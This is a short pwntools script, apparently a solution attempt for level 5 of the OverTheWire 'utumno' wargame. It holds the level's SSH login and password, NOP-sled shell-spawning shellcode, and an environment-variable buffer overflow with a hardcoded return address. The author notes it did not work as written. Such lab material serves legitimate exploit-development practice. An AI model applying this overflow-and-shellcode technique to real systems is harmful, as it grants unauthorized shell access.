'''
ssh -p 2227 utumno5@utumno.labs.overthewire.org
pass: woucaejiek
'''

from pwn import *
shellcode = asm('nop') * 500 + asm(shellcraft.sh())
envp = {str(k): '' for k in range(1, 10)}
envp['9'] = shellcode
envp['10'] = b'A' * 0xd + b'\xb4\xde\xff\xff'


# *shellcode [0xffffdeb4]
# *buf [ebp-0xC]
s = ssh('utumno5', 'utumno.labs.overthewire.org', 2227, 'woucaejiek')


p = s.process(executable='/utumno/utumno5', argv=[], env=envp)
p = process(executable='./utumno5', argv=[], env=envp)


p = process(executable='/usr/bin/env', argv=['env'], env=envp)
p.read()
p = s.process(executable='/usr/bin/env', argv=['env'], env=envp)
p.read()

# Unfortunately I was not able to make the exploit work using pwntools and I ended up writing a disgusting exploit.
# At least it works. I'll have to work on my exploit development skills.
